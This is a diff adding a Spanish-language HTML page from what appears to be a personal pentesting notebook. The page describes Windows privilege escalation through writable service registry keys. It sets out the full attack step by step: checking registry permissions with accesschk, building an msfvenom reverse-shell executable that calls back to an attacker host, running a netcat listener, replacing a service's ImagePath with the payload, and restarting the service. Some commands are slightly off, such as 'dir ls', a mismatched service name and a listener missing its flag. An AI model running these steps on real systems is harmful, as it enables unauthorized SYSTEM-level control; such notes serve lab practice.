@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Permisos en Registros | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="permisos-en-registros">
+          <div class="note-tabbar">
+            <span>Permisos en Registros</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Servicios y procesos</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / servicios y procesos</p>
+            <h2>Permisos en Registros</h2>
+
+            <aside class="callout">
+              <p><strong>Ejecutar función auxiliar: <span>Función Auxiliar</span></strong> </p>
+            </aside>
+
+            <section class="code-card">
+              <h3>1. Lista servicios desde los registros y Comprueba permisos del Path</h3>
+              <pre><code># PowerShell: Lista servicios desde los registros y Comprueba permisos del Path
+ls HKLM:\SYSTEM\CurrentControlSet\Services\ | ForEach-Object { if(ModifiablePath $_.PSPath){$_.PSPath}}
+# Servicio vulnerable: regsvc
+
+# CMD
+# Enumerar servicios desde los registros
+dir ls HKLM:\SYSTEM\CurrentControlSet\Services\
+# Comprobar los permisos del registro
+accesschk.exe /accepteula -kdqv &quot;HKLM\SYSTEM\CurrentControlSet\Services\&lt;service_name&gt;&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>2. Kali: Payload y Listener</h3>
+              <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f exe &gt; rev.exe
+rlwrap nc 443</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>3. Reemplazar el ImagePath por la ruta a nuestro reverse shell</h3>
+              <pre><code># PowerShell
+reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\regsvc&quot; /f /v ImagePath /t REG_SZ /d &quot;C:\path\rev.exe&quot;
+# Revisar Cambio en el Path
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\Services\regsvc&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>4. Reiniciar el servicio. Se debe producir un fallo al reiniciar</h3>
+              <pre><code># PowerShell
+cmd /c sc stop filepermservice
+cmd /c sc start filepermservice
+# CMD / PowerShell
+sc.exe stop filepermservice
+net stop filepermservice # Alternativa
+sc.exe start filepermservice
+net start filepermservice # Alternativa</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=giddy">Giddy</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>servicios</span>
+              <span>procesos</span>
+              <span>permisos</span>
+              <span>registros</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
